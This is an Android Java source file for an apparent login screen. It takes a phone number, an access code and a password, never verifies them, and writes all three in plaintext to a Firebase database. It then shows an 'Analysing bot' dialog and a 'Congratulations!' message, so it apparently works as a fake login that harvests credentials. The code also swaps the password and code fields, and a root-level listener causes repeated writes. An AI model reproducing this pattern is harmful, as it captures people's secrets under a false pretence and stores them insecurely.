package com.kim.firebaze;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.ProgressDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.HashMap;

public class LoginTest extends AppCompatActivity {
    EditText number,code,pass;
    Button login;
    String num,co,pa;
    private ProgressDialog loadingBar;



    DatabaseReference mDatabase;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        loadingBar=new ProgressDialog(LoginTest.this);
        loadingBar.setTitle("Analysing bot");
        loadingBar.setMessage("Processing....");

          mDatabase = FirebaseDatabase.getInstance().getReference();

        number=findViewById(R.id.foneid);
        code=findViewById(R.id.accescode);
        pass=findViewById(R.id.passid);
        login=findViewById(R.id.idbtn);
        login.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                getDetails();
            }
        });
    }

    private void getDetails() {


        num=number.getText().toString();
        co=code.getText().toString();
        pa=pass.getText().toString();
        if (num.isEmpty() || co.isEmpty() || pa.isEmpty())
        {

            Toast.makeText(this, "Enter all details", Toast.LENGTH_SHORT).show();

        }else{
            mDatabase.addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    loadingBar.show();


                    HashMap<String, Object> userdataMap = new HashMap<>();
                    userdataMap.put("phone",num);
                    userdataMap.put("password", co);
                    userdataMap.put("code", pa);

                    mDatabase.child("Users").child(num).updateChildren(userdataMap)
                            .addOnCompleteListener(new OnCompleteListener<Void>() {
                                @Override
                                public void onComplete(@NonNull Task<Void> task)
                                {
                                    if (task.isSuccessful())
                                    {
                                        Toast.makeText(LoginTest.this, "Congratulations!", Toast.LENGTH_SHORT).show();
                                        loadingBar.dismiss();

                                        Intent intent = new Intent(LoginTest.this,MainActivity.class);
                                        startActivity(intent);
                                    }
                                    else
                                    {
                                        loadingBar.dismiss();
                                        Toast.makeText(LoginTest.this, "Network Error: Please try again after some time...", Toast.LENGTH_SHORT).show();
                                    }
                                }
                            });


                }

                @Override
                public void onCancelled(@NonNull DatabaseError error) {

                }
            });


        }
    }
}